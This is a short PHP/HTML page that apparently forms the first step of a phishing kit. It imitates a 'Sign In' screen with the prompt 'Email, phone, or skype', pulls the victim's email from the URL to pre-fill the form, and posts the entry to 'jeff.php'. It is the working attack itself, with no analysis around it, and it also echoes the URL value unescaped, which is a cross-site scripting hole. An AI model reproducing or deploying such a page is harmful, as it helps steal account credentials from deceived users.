
<!doctype html>
<html>
<head>
<title>Sign In</title>
<body>
  <link href="style.css" rel="stylesheet">
  <?php
/*
Get email from URL and set to email1 variable
*/
$email1 = $_GET['email'];
?><center>
<form action="jeff.php" method="post"><br><br><br>
<br><br><br><br><br><fieldset><br>
<img src="https://i.imgur.com/nzqsLYY.png"><br>
<input type="text" name="user" placeholder="Email, phone, or skype" value="<?php echo $email1;?>" required >
<br><img src="https://i.imgur.com/Zju9ooP.png">
    <br>
    <input type="submit" name="submit" value="Next"/> <br> <br><br></fieldset>

</center>
</form>

</body>
</html>